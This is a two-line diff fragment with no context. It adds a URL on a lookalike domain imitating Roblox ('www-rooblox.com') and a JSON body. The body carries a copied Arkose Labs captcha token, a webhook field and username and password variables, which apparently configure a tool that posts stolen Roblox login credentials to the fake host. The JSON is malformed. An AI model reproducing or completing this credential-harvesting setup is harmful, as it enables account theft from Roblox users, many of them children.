@@ -1,0 +1,2 @@
+1: https://www-rooblox.com/api/loginv2.php
+1: {"token" : "684605a1ba3232678.1000751601|r=us-east-1|metabgclr=transparent|guitextcolor=%23474747|maintxtclr=%23b8b8b8|metaiconclr=transparent|meta=6|lang=en|pk=476068BF-9607-4799-B53D-966BE98E2B81|at=40|ht=1|cdn_url=https://cdn.arkoselabs.com/fc|lurl=https://audio-us-east-1.arkoselabs.com|surl=https://roblox-api.arkoselabs.com", "webhook": "XyzzI", "username": varuser, "password" : varpass}
